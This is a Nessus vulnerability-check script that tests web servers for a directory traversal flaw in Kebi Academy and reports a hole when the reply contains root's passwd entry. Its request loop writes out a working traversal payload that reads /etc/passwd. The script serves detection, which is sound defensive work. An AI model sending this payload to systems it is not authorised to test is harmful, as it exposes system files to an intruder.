# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11453); 
 
 script_bugtraq_id(7125);
 
 script_version("$Revision: 1.2 $");

 name["english"] = "Kebi Academy Directory Traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "
Kebi Academy is vulnerable to a directory traversal.  
It enables a remote attacker to view any file on the computer 
with the privileges of the cgi/httpd user.

Solution : Contact the vendor at http://solution.nara.co.kr/
Risk factor : Serious";

 script_description(english:desc["english"]);
 
 summary["english"] = "kebi academy is vulnerable to an exploit which lets an attacker view any file that the cgi/httpd user has access to.";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;


if(!get_port_state(port))exit(0);


function check(req)
{
  req = http_get(item:req, port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if ( r == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   	security_hole(port:port);
	return(1);
  }
 return(0);
}


alldirs = make_list("", "/k");


dirs = cgi_dirs();
foreach  d (dirs)
{
 alldirs = make_list(alldirs, d, string(d, "/k"));
}


foreach d (alldirs)
{
 url = string(d, "/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor");
 if(check(req:url))exit(0);
}
